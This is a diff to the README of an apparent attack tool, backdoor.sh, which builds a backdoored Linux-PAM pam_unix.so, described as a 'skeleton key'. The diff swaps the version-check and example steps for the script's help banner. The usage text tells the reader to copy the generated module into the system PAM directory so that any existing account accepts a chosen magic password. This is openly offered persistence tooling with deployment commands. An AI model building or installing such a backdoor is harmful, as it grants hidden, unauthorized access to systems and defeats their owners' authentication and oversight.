@@ -2,20 +2,24 @@
 This script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules). This is also known as a skeleton key.
 
 ## Usage
-To generate the backdoored pam_unix.so run the following (Debian Based) command to determine the existing version of pam_unix.so on the host:
+The following banner shows the help menu
 ```sh
-dpkg -l | grep libpam0g
+sudo ./backdoor.sh                                                                                                                                     1 ↵
+Error: Password (-p) is required unless using --restore.
+Usage: ./backdoor.sh [-v version] -p password [--restore]
+
+Options:
+  -v          Specify Linux-PAM version (e.g., 1.3.1).
+  -p          The 'magic' password for the backdoor.
+  --restore   Restore the original pam_unix.so from backup.
+  -h, --help  Show this help message.
 ```
-Once you have the version run the following command with the `-v` as the version you found using the previous command and `-p` as the skeleton key/universal password.
-```sh
-./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd
-```
-You have to identify the PAM version installed on the system, to make sure the script will compile the right version. Otherwise you can break the whole system authentication.
 
 After the execution of the script, the last step is to copy the generated pam_unix.so to the pam modules dir on the host. 
 ```sh
 cp ./pam_unix.so /lib/x86_64-linux-gnu/security
 ```
+
 After that, you can login to the system using an existing user, and the previously configured password.
 
 ## Resources
